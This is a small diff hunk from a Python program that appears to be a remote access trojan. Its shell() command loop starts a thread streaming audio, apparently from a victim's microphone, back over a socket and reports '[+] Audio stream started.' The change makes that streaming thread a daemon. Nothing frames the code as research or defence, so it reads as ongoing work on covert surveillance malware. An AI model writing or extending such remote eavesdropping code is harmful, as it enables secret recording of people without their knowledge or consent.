@@ -226,6 +226,7 @@ def shell():
             if not streaming_flag['on']:
                 streaming_flag['on'] = True
                 stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
+                stream_thread.daemon = True
                 stream_thread.start()
             reliable_send("[+] Audio stream started.")
         elif command == 'listening_stop':
